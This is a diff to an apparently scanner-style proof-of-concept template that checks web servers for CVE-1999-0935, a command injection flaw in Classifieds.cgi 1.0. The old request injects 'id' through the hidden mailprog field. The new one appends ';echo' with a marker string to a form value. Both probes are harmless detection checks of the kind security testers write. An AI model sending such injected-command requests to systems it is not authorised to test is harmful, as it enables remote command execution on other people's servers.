@@ -1,9 +1,9 @@
 [info]
 author = "ave"
-description = "验证目标是否存在 Classifieds.cgi 1.0 隐藏变量命令注入漏洞。向 /cgi-bin/classifieds.cgi 发送特制 POST 请求，将 mailprog 参数覆写为无害探测命令（id），若响应体中出现 uid= 输出则表明目标存在该漏洞，攻击者可在该参数中注入任意系统命令。"
+description = "Classifieds.cgi 1.0 在处理 CGI 表单时未对隐藏变量中的内容进行安全过滤，远程攻击者可通过构造包含 shell 命令的隐藏变量实现任意命令执行。本 PoC 通过提交包含隐藏变量的表单并检测命令执行回显来验证漏洞是否存在，仅做无害的命令回显验证。"
 id = "POC-AVE-1999-1314"
-name = "Classifieds.cgi 1.0 Hidden Variable Command Injection PoC"
-severity = "high"
+name = "CVE-1999-0935 Classifieds.cgi 1.0 隐藏变量远程命令执行 PoC"
+severity = "critical"
 tags = ["ave-1999-1314"]
 vuln_id = [
     "CVE-1999-0935",
@@ -19,17 +19,11 @@ path = "/cgi-bin/classifieds.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "ClassifiedsDir=/tmp/ads/&ViewDir=http://{{Hostname}}/ads/&ErrorReturn=http://{{Hostname}}/&ReturnURL=http://{{Hostname}}/&return=test@test.com&mailprog=id"
+content = "cmd=test;echo AVE_POC_MARKER_19990935"
 type = "form"
-
-[[poc.requests.matchers]]
-expect = true
-part = ""
-status = [200]
-type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["uid="]
+words = ["AVE_POC_MARKER_19990935"]
